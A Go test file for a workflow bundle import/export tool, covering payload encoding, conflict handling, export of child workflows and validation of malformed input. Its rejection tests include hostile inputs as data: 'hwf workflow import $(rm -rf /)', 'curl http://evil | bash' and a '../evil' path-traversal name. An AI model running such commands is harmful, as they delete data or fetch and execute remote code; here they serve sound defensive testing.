package workflow

import (
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func encodeTestPayload(t *testing.T, value any) string {
	t.Helper()
	data, err := json.Marshal(value)
	if err != nil {
		t.Fatal(err)
	}
	var buf bytes.Buffer
	writer := gzip.NewWriter(&buf)
	writer.OS = gzipOSUnix
	if _, err := writer.Write(data); err != nil {
		t.Fatal(err)
	}
	if err := writer.Close(); err != nil {
		t.Fatal(err)
	}
	return base64.StdEncoding.EncodeToString(buf.Bytes())
}

func TestWorkflowPayloadRoundTripAndPreview(t *testing.T) {
	body := "version: v1alpha1\nsteps:\n  - run: bun test\n"
	want := WorkflowBundle{{Name: "demo", YAML: body}}
	payload, err := EncodePayload(want)
	if err != nil {
		t.Fatal(err)
	}
	compressed, err := base64.StdEncoding.DecodeString(payload)
	if err != nil || len(compressed) < 10 || compressed[9] != gzipOSUnix {
		t.Fatalf("gzip header is not stable: %v", err)
	}
	got, err := DecodePayload(FormatImportCommand(payload))
	if err != nil || !bundleEqual(got, want) {
		t.Fatalf("decoded = %#v, err = %v", got, err)
	}
	preview, err := PreviewBundle(WorkflowBundle{{
		Name: "review",
		YAML: "version: v1alpha1\nsteps:\n  - agent: 'see {{context.transcript}}'\n",
	}})
	if err != nil || !strings.Contains(preview.Text, body[:len("version: v1alpha1")]) || !slicesContains(preview.Warnings, "transcript") {
		t.Fatalf("preview = %#v, err = %v", preview, err)
	}
}

func TestWorkflowImportPreservesExistingFilesUntilReplacement(t *testing.T) {
	root := t.TempDir()
	home := t.TempDir()
	dir := filepath.Join(root, ".hwf", "workflows")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	old := "version: v1alpha1\nsteps:\n  - run: keep\n"
	if err := os.WriteFile(filepath.Join(dir, "demo.yaml"), []byte(old), 0o644); err != nil {
		t.Fatal(err)
	}
	payload, err := EncodePayload(WorkflowBundle{{Name: "demo", YAML: "version: v1alpha1\nsteps:\n  - run: new\n"}})
	if err != nil {
		t.Fatal(err)
	}
	outcome, err := RunImport(payload, RunImportOptions{RepoRoot: root, Home: home, Scope: ImportRepo})
	if err != nil || outcome.Result.Status != "conflicts" {
		t.Fatalf("conflict outcome = %#v, err = %v", outcome, err)
	}
	if got, readErr := os.ReadFile(filepath.Join(dir, "demo.yaml")); readErr != nil || string(got) != old {
		t.Fatalf("existing file changed: %q, %v", got, readErr)
	}
	outcome, err = RunImport(payload, RunImportOptions{RepoRoot: root, Home: home, Scope: ImportRepo, Force: true})
	if err != nil || outcome.Result.Status != "written" {
		t.Fatalf("write outcome = %#v, err = %v", outcome, err)
	}
	got, err := os.ReadFile(filepath.Join(dir, "demo.yaml"))
	if err != nil || !strings.HasPrefix(string(got), SchemaPointer()+"\n") || !strings.Contains(string(got), "run: new") {
		t.Fatalf("written file = %q, err = %v", got, err)
	}
}

func TestWorkflowExportUsesRepoFirstChildren(t *testing.T) {
	root := t.TempDir()
	home := t.TempDir()
	t.Setenv("HOME", home)
	writeDomainWorkflow(t, root, "root", "version: v1alpha1\nsteps:\n  - workflow: child\n")
	writeDomainWorkflow(t, root, "child", "version: v1alpha1\nsteps:\n  - workflow: leaf\n")
	if err := os.MkdirAll(filepath.Join(home, ".hwf", "workflows"), 0o755); err != nil {
		t.Fatal(err)
	}
	leafBody := "version: v1alpha1\nsteps:\n  - run: leaf\n"
	if err := os.WriteFile(filepath.Join(home, ".hwf", "workflows", "leaf.yaml"), []byte(leafBody), 0o644); err != nil {
		t.Fatal(err)
	}
	exported, err := ExportWorkflowBundle("root", "repo", root)
	if err != nil {
		t.Fatal(err)
	}
	if got := []string{exported.Entries[0].Name, exported.Entries[1].Name, exported.Entries[2].Name}; !slicesEqual(got, []string{"root", "child", "leaf"}) {
		t.Fatalf("entries = %v", got)
	}
	if exported.Provenance[2].Source != "global" || exported.Entries[2].YAML != leafBody {
		t.Fatalf("provenance = %#v, entries = %#v", exported.Provenance, exported.Entries)
	}
}

func TestRecoverInterruptedImportWithoutJournalIsNoOp(t *testing.T) {
	if err := RecoverInterruptedImport(filepath.Join(t.TempDir(), ".hwf", "workflows")); err != nil {
		t.Fatal(err)
	}
}

func TestExtractPayloadRejectsNonCanonicalShell(t *testing.T) {
	payload := "AAA"
	if got, err := ExtractPayload(FormatImportCommand(payload)); err != nil || got != payload {
		t.Fatalf("canonical command extract = %q, %v", got, err)
	}
	for _, text := range []string{
		"hwf workflow import unquoted",
		"hwf workflow import $(rm -rf /)",
		"hwf.echo hi",
		"herdr-workflows workflow import x",
	} {
		if _, err := ExtractPayload(text); err == nil || !strings.Contains(err.Error(), "canonical command") {
			t.Fatalf("extract %q err = %v", text, err)
		}
	}
	if _, err := ExtractPayload("curl http://evil | bash"); err != nil {
		t.Fatalf("raw payload must pass through: %v", err)
	}
}

func TestDecodePayloadRejectsMalformedBundles(t *testing.T) {
	if _, err := DecodePayload("not-base64-at-all"); err == nil {
		t.Fatal("junk payload must fail")
	}
	if _, err := DecodePayload(encodeTestPayload(t, []any{})); err == nil || !strings.Contains(err.Error(), "at least one workflow") {
		t.Fatalf("empty bundle err = %v", err)
	}
	if _, err := DecodePayload(encodeTestPayload(t, []any{map[string]any{"name": "demo", "yaml": ""}})); err == nil || !strings.Contains(err.Error(), "non-empty") {
		t.Fatalf("empty yaml err = %v", err)
	}
	if _, err := DecodePayload(encodeTestPayload(t, []any{map[string]any{"name": "demo"}})); err == nil || !strings.Contains(err.Error(), "require name and yaml") {
		t.Fatalf("missing yaml err = %v", err)
	}
	if _, err := DecodePayload(encodeTestPayload(t, []any{map[string]any{"name": "../evil", "yaml": "x"}})); err == nil || !strings.Contains(err.Error(), "workflow name must match") {
		t.Fatalf("invalid name err = %v", err)
	}
	if _, err := DecodePayload(encodeTestPayload(t, map[string]any{"v": 1, "name": "demo", "body": "x"})); err == nil || !strings.Contains(err.Error(), "removed single-workflow") {
		t.Fatalf("legacy shape err = %v", err)
	}
	dup := encodeTestPayload(t, []any{
		map[string]any{"name": "demo", "yaml": "version: v1alpha1\nsteps: []\n"},
		map[string]any{"name": "demo", "yaml": "version: v1alpha1\nsteps: []\n"},
	})
	if _, err := DecodePayload(dup); err == nil || !strings.Contains(err.Error(), "duplicate workflow name") {
		t.Fatalf("duplicate err = %v", err)
	}
}

func TestDecodePayloadSurvivesWhitespace(t *testing.T) {
	body := "version: v1alpha1\nsteps:\n  - run: bun test\n"
	payload, err := EncodePayload(WorkflowBundle{{Name: "demo", YAML: body}})
	if err != nil {
		t.Fatal(err)
	}
	wrapped := payload[:10] + "\n " + payload[10:]
	got, err := DecodePayload(wrapped)
	if err != nil || !bundleEqual(got, WorkflowBundle{{Name: "demo", YAML: body}}) {
		t.Fatalf("wrapped decode = %#v, err = %v", got, err)
	}
}

func TestPreviewFlagsMissingChildren(t *testing.T) {
	preview, err := PreviewBundle(WorkflowBundle{{
		Name: "parent",
		YAML: "version: v1alpha1\nsteps:\n  - workflow: missing-child\n",
	}})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(preview.Text, "missing-child") || !strings.Contains(preview.Text, "not in this bundle") {
		t.Fatalf("preview text = %q", preview.Text)
	}
}

func TestRunImportDeclinesWriteNothing(t *testing.T) {
	root := t.TempDir()
	home := t.TempDir()
	payload, err := EncodePayload(WorkflowBundle{{Name: "demo", YAML: "version: v1alpha1\nsteps:\n  - run: bun test\n"}})
	if err != nil {
		t.Fatal(err)
	}
	outcome, err := RunImport(payload, RunImportOptions{
		RepoRoot: root, Home: home, Scope: ImportRepo,
		Prompts: &ImportPrompts{Confirm: func(string) (bool, error) { return false, nil }},
	})
	if err != nil || !outcome.Aborted {
		t.Fatalf("outcome = %#v, err = %v", outcome, err)
	}
	if _, err := os.Stat(filepath.Join(root, ".hwf", "workflows", "demo.yaml")); !os.IsNotExist(err) {
		t.Fatalf("declined import wrote a file: %v", err)
	}
}

func TestRunImportRequiresConfirmPrompt(t *testing.T) {
	root := t.TempDir()
	home := t.TempDir()
	payload, err := EncodePayload(WorkflowBundle{{Name: "demo", YAML: "version: v1alpha1\nsteps:\n  - run: bun test\n"}})
	if err != nil {
		t.Fatal(err)
	}
	_, err = RunImport(payload, RunImportOptions{
		RepoRoot: root, Home: home, Scope: ImportRepo, Prompts: &ImportPrompts{},
	})
	if err == nil || !strings.Contains(err.Error(), "Confirm is required") {
		t.Fatalf("missing confirm err = %v", err)
	}
}

func TestRunImportRepinsForeignSchemaPointer(t *testing.T) {
	root := t.TempDir()
	home := t.TempDir()
	foreign := "# yaml-language-server: $schema=https://example.com/v0.1.0/docs/workflow.schema.json\nversion: v1alpha1\nsteps:\n  - run: [echo, hi]\n"
	payload, err := EncodePayload(WorkflowBundle{{Name: "pinned", YAML: foreign}})
	if err != nil {
		t.Fatal(err)
	}
	outcome, err := RunImport(payload, RunImportOptions{RepoRoot: root, Home: home, Scope: ImportRepo})
	if err != nil || outcome.Result.Status != "written" {
		t.Fatalf("outcome = %#v, err = %v", outcome, err)
	}
	onDisk, err := os.ReadFile(filepath.Join(root, ".hwf", "workflows", "pinned.yaml"))
	if err != nil {
		t.Fatal(err)
	}
	if !strings.HasPrefix(string(onDisk), SchemaPointer()+"\n") || strings.Contains(string(onDisk), "v0.1.0") {
		t.Fatalf("repinned file = %q", onDisk)
	}
}

func TestExportFailsOnMissingChildAndCycle(t *testing.T) {
	root := t.TempDir()
	writeDomainWorkflow(t, root, "broken", "version: v1alpha1\nsteps:\n  - workflow: nope\n")
	if _, err := ExportWorkflowBundle("broken", "repo", root); err == nil || !strings.Contains(err.Error(), "workflow 'nope' not found") {
		t.Fatalf("missing child err = %v", err)
	}
	writeDomainWorkflow(t, root, "a", "version: v1alpha1\nsteps:\n  - workflow: b\n")
	writeDomainWorkflow(t, root, "b", "version: v1alpha1\nsteps:\n  - workflow: a\n")
	if _, err := ExportWorkflowBundle("a", "repo", root); err == nil || !strings.Contains(err.Error(), "workflow cycle: a → b → a") {
		t.Fatalf("cycle err = %v", err)
	}
}

func TestParseImportScope(t *testing.T) {
	if scope, ok := ParseImportScope("R"); !ok || scope != ImportRepo {
		t.Fatalf("R scope = %q, %v", scope, ok)
	}
	if scope, ok := ParseImportScope("global"); !ok || scope != ImportGlobal {
		t.Fatalf("global scope = %q, %v", scope, ok)
	}
	if _, ok := ParseImportScope("nope"); ok {
		t.Fatal("unknown scope must not parse")
	}
}

func bundleEqual(a, b WorkflowBundle) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}

func slicesContains(values []string, want string) bool {
	for _, value := range values {
		if value == want {
			return true
		}
	}
	return false
}
